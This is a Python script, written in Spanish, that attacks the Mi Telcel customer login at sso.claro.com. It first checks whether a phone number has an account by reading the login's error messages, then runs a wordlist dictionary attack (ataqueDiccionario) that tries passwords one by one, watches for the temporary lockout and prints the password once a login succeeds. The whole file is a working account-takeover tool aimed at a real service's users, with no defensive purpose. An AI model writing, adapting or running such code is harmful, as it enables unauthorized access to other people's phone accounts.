import colores
import requests
import validacion


class telcel:

    def __init__(self, numero):
        self.numero = numero
        self.compañia = "Telcel"
        self.bloqueado = False
        self.registrado = False
        self.registradoWeb = False
        self.comprobarNumero()

    def comprobarNumero(self):

        _response = requests.post('https://sso.claro.com:9080/login?sitedomain=https://www.mitelcel.com/mitelcel&CCode=52&Type=MSISDN&Invocation=iFrame',
                                    headers=self.headers(),
                                    data=self.data(self.numero, 'badSecurity'),
                                    timeout=50)

        self.validaResponse(_response.text)

    def validaResponse(self, _data):

        if 'es incorrecta' in _data:
            self.registradoWeb = True
            self.registrado = True
            self.bloqueado = False

        elif 'Has excedido el' in _data:
            self.registradoWeb = True
            self.registrado = True
            self.bloqueado = True

        elif 'Usuario no registrado' in _data:
            self.registradoWeb = False
            self.registrado = False
            self.bloqueado = False

        else:
            self.registradoWeb = False
            self.registrado = False
            self.bloqueado = False

    def ataqueDiccionario(self):

        if not self.bloqueado:
            colores.textPrimario(" >>> Casi empezamos ")
            colores.textError(" El sistema de Telcel es 'bueno' por lo que al 20-25 intento se bloquea temporalmente (10 min aprox)")
            _archivo = colores.inputBold(" ¿ Quieres continuar s/n ? : ")

            if _archivo != 's':
                colores.hr()
                colores.textError(" >>> Bien pensado ;)")
                colores.hr()
                exit()

            colores.hr()
            colores.textPrimario(" >>> Atancando ...  \n")

            _contraseñas = validacion.leerContraseñas()

            for _contraseña in _contraseñas:

                _contraseña = _contraseña.rstrip('\n')

                _response = requests.post('https://sso.claro.com:9080/login?sitedomain=https://www.mitelcel.com/mitelcel&CCode=52&Type=MSISDN&Invocation=iFrame',
                                            headers=self.headers(),
                                            data=self.data(self.numero, _contraseña),
                                            timeout=50)

                print("  Probando:", _contraseña.ljust(30), "\033[0;m", end='\r')

                if 'intentos' in _response.text:
                    colores.hr()
                    colores.textError("\t\t\t Ya nos bloquearon :( ")
                    colores.hr()
                    exit()

                if 'incorrecta' not in _response.text:
                    colores.hr()
                    colores.textSuccess("\t\t\t[ Contraseña correcta ( 90% seguro ) : " + _contraseña + "]")
                    colores.hr()
                    exit()

            colores.textError("\t\t\t[ Contraseña no encontrada ]")
            colores.hr()
            exit()

        else:
            colores.textError(" ¡¡¡ CUIDADO !!!   \n")
            colores.textError("La cuenta esta bloqueada temporalmente. Ejecute el script más tarde. ")
            colores.hr()
            exit()

    def headers(self):

        return {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://sso.claro.com:9080/login?sitedomain=https://www.mitelcel.com/mitelcel&CCode=52&Type=MSISDN&Invocation=iFrame',
            'Accept-Language': 'es-419,es;q=0.9,en;q=0.8,gl;q=0.7',
        }

    def data(self, _numero, _password):

        return {
            'username': _numero,
            'password': _password,
            'sitedomain': 'https://www.mitelcel.com/mitelcel',
            'CCode': '52',
            'Type': 'MSISDN',
            'Invocation': 'iFrame',
            'MSISDN': '',
            'Source': ''
        }
